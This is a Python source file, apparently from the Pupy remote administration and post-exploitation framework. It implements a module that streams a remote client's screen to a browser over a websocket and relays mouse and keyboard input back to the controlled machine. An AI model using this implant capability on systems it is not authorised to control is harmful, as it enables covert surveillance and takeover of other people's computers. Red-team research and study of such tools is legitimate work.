# -*- coding: UTF8 -*-
# Copyright (c) 2017, Nicolas VERDIER (contact@n1nj4.eu)
# Pupy is under the BSD 3-Clause license. see the LICENSE file at the root of the project for the detailed licence terms

from pupylib import *
import base64
import subprocess
import time
import threading
import json
import pyautogui

__class_name__="RemoteDesktopModule"

class RdesktopWebSocketHandler(WebSocketHandler):
    def initialize(self, client, refresh_interval, quality, module):
        self.client=client
        self.width=None
        self.height=None
        self.refresh_interval=refresh_interval
        self.quality=quality
        self.remote_streamer=None
        self.module=module
        self.events_thread=None
        self.stop_events_thread=threading.Event()
        self.mouse_pos=None
        self.mouse_lock=threading.Lock()

    def on_open(self):
        self.set_nodelay(True)
        pass

    def events_handler(self, mouse_refresh_rate=0.01):
        """ function to handle events in queue """
        while not self.stop_events_thread.is_set():
            try:
                mp=None
                with self.mouse_lock:
                    if self.mouse_pos:
                        mp=self.mouse_pos
                        self.mouse_pos=None
                if mp:
                    #print "moving to %s"%str(mp)
                    self.remote_streamer.move(*mp)
                time.sleep(mouse_refresh_rate)
            except Exception as e:
                logging.error(e)
                break


    def on_message(self, data):
        js=json.loads(data)
        if js['msg']=="start_stream":
            self.width, self.height = self.client.conn.modules['rdesktop'].get_screen_size()
            self.start_stream()
        elif js['msg']=="click":
            logging.debug("mouse click at : (%s, %s)"%(js['x'], js['y']))
            self.remote_streamer.click(int(js['x']), int(js['y']))
        elif js['msg']=="move":
            with self.mouse_lock:
                self.mouse_pos=(int(js['x']), int(js['y']))
        elif js['msg']=="keypress":
            key=js['key'] #unicode key
            logging.debug("key press : %s"%key)
            try:
                if len(key) > 1:
                    key=key.lower()
                    self.remote_streamer.kbd_send(key)
		else:
		    self.remote_streamer.kbd_write(key)
            except Exception as e:
                logging.error(e)
        else:
            logging.error("unknown message:"+data)

    def update_video_callback(self, jpg_data):
        try:
            self.write_message(json.dumps({'screen': base64.b64encode(jpg_data), 'width': self.width, 'height': self.height}))
        except tornado.websocket.WebSocketClosedError:
            pass

    def start_stream(self):
        logging.debug("starting video stream stream ...")
        if self.remote_streamer:
            self.remote_streamer.stop()
        self.remote_streamer=self.client.conn.modules['rdesktop'].VideoStreamer(self.update_video_callback, refresh_interval=self.refresh_interval, quality=self.quality)
        if self.stop_events_thread:
            self.stop_events_thread.set()
            self.stop_events_thread=threading.Event()
        self.remote_streamer.start()
        self.events_thread=threading.Thread(target=self.events_handler)
        self.events_thread.daemon=True
        self.events_thread.start()
        logging.debug("streaming video started")

    def on_close(self):
        if self.remote_streamer:
            self.remote_streamer.stop()
        if self.stop_events_thread:
            self.stop_events_thread.set()


class IndexHandler(RequestHandler):
    def initialize(self, client):
        self.client = client

    @tornado.web.asynchronous
    def get(self):
        self.render("rdesktop/index.html", port=self.client.pupsrv.pupweb.port)

@config(category="admin", tags=["rdesktop","rdp", "vnc", "remote", "desktop"], compat=['windows', 'linux', 'darwin'])
class RemoteDesktopModule(PupyModule):
    """ Start a remote desktop session using a browser websocket client """

    dependencies = ['mss', 'rdesktop', 'keyboard', 'PIL']

    def init_argparse(self):
        self.arg_parser = PupyArgumentParser(prog="rdesktop", description=self.__doc__)
        self.arg_parser.add_argument('-v', '--view', action='store_true', help='directly open a browser tab on the handler url')
        self.arg_parser.add_argument('-r', '--refresh-interval', default=0.02, type=float, help='refresh interval. Set to 0 for best reactivity')
        self.arg_parser.add_argument('-q', '--quality', default=75, type=int, help='image quality best_quality=95 worst_quality=20')
        #self.arg_parser.add_argument('text', help='text to print in the msgbox :)')


    def run(self, args):
        self.web_handlers=[
            (r'/?', IndexHandler, {'client': self.client}),
            (r'/ws', RdesktopWebSocketHandler, {'client': self.client, 'refresh_interval': args.refresh_interval, 'quality':args.quality, 'module': self}),
        ]
        url=self.start_webplugin()
        self.success("Web handler started on %s"%url)
        if args.view:
            config = self.client.pupsrv.config or PupyConfig()
            viewer = config.get('default_viewers', 'browser')
            subprocess.Popen([viewer, url])

